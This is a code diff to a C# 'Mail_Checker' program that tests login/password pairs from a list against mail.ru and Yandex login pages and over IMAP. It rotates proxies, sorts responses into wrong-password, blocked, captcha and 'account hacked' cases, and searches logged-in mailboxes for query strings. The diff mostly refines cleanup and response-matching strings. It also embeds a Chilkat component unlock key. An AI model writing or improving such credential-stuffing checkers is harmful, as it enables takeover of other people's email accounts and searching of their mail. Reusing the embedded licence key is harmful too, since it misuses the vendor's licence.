@@ -4,6 +4,7 @@ using System.Threading;
 using System.Text.RegularExpressions;
 using xNet.Net;
 using System.Collections.Generic;
+using System.Diagnostics.Contracts;
 using Chilkat;
 
 //----удаление дубликатов
@@ -41,7 +42,7 @@ namespace Mail_Checker
         public ConcurrentStack<string> mails;
         ConcurrentQueue<ProxyStats> proxys;
         string[] querys;
-        bool proxyCheck = true;
+        public bool proxyCheck = true;
         List<Thread> threadsList;
 
 
@@ -112,6 +113,8 @@ namespace Mail_Checker
 
 
         Random r = new Random();
+
+
 
         void Check()
         {
@@ -250,6 +253,7 @@ namespace Mail_Checker
 
             error = CheckErrors.noError;
 
+            xNet.Net.HttpRequest req1 = null, req2=null;
 
             try
             {
@@ -258,13 +262,13 @@ namespace Mail_Checker
                 HttpProxyClient proxy = new HttpProxyClient(proxyElements[0], Convert.ToInt32(proxyElements[1]));
                 CookieDictionary cookies = new CookieDictionary();
 
-                xNet.Net.HttpRequest req1 = new xNet.Net.HttpRequest();
+                req1 = new xNet.Net.HttpRequest();
                 req1.Proxy = proxy;
                 req1.Cookies = cookies;
                 req1.ConnectTimeout = timeout * 1000;
                 req1.UserAgent = "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10";
 
-                xNet.Net.HttpResponse res1 = req1.Post("https://auth.mail.ru/cgi-bin/auth",
+                xNet.Net.HttpResponse  res1 = req1.Post("https://auth.mail.ru/cgi-bin/auth",
                     "Login=" + loginDomain[0] + "&Domain=" + loginDomain[1] + "&Password=" + mailElements[1] + "&saveauth=1&new_auth_form=1",
                     "application/x-www-form-urlencoded");
 
@@ -286,7 +290,7 @@ namespace Mail_Checker
                     return;
                 }
 
-                xNet.Net.HttpRequest req2 = new xNet.Net.HttpRequest();
+                req2 = new xNet.Net.HttpRequest();
                 req2.Proxy = proxy;
                 req2.Cookies = cookies;
                 req2.ConnectTimeout = timeout * 1000;
@@ -337,6 +341,9 @@ namespace Mail_Checker
             }
 
 
+            if (req1!=null) req1.Dispose();
+            if (req2!=null) req2.Dispose();
+
         }
 
 
@@ -352,6 +359,7 @@ namespace Mail_Checker
 
             error = CheckErrors.noError;
 
+            xNet.Net.HttpRequest req1=null, req2=null;
 
             try
             {
@@ -360,7 +368,7 @@ namespace Mail_Checker
                 HttpProxyClient proxy = new HttpProxyClient(proxyElements[0], Convert.ToInt32(proxyElements[1]));
                 CookieDictionary cookies = new CookieDictionary();
 
-                xNet.Net.HttpRequest req1 = new xNet.Net.HttpRequest();
+                req1 = new xNet.Net.HttpRequest();
                 req1.Proxy = proxy;
                 req1.Cookies = cookies;
                 req1.ConnectTimeout = timeout * 1000;
@@ -373,7 +381,7 @@ namespace Mail_Checker
                 string res1str = res1.ToString();
 
 
-                if (res1str.Contains("account_hacked_phone") ||
+                if (res1str.Contains("account_hacked_phone") || res1str.Contains("b-mail-domik-permament11") ||
                     res1str.Contains("восстановление доступа к логину") || res1str.Contains("Ваш логин заблокирован") ||
                     res1str.Contains("domik-error-captcha") || res1str.Contains("account_hacked_no_phone") || 
                     res1str.Contains("Неправильная пара логин-пароль") || res1str.Contains("записи с таким логином не существует"))
@@ -381,7 +389,7 @@ namespace Mail_Checker
                     error = CheckErrors.mailError;
                     return;
                 }
-                else if (!res1str.Contains("Яндекс.Почта"))
+                else if (!res1str.Contains("/mail/neo2"))
                 {
                     error = CheckErrors.proxyError;
                     return;
@@ -391,7 +399,7 @@ namespace Mail_Checker
                 for (int i = 0; i < querys.Length; i++)
                 {
 
-                    xNet.Net.HttpRequest req2 = new xNet.Net.HttpRequest();
+                    req2 = new xNet.Net.HttpRequest();
                     req2.Proxy = proxy;
                     req2.Cookies = cookies;
                     req2.ConnectTimeout = timeout * 1000;
@@ -436,6 +444,9 @@ namespace Mail_Checker
             }
 
 
+            if (req1 != null) req1.Dispose();
+            if (req2 != null) req2.Dispose();
+
         }
 
 
@@ -452,11 +463,12 @@ namespace Mail_Checker
 
 
             Imap imap = new Imap();
+            imap.UnlockComponent("1QCDO-156DU-TN61L-13B9N-HQO0G");
             imap.ConnectTimeout = timeout;
             imap.ReadTimeout = timeout;
             imap.Ssl = true;
             imap.Port = 993;
-            imap.UnlockComponent("1QCDO-156DU-TN61L-13B9N-HQO0G");
+            
 
 
             imap.HttpProxyHostname = proxyElements[0];
@@ -531,8 +543,8 @@ namespace Mail_Checker
             }
 
 
-            imap.Disconnect();
-            imap.Dispose();
+            if (imap != null) imap.Disconnect();
+            if (imap!=null) imap.Dispose();
 
         }
 
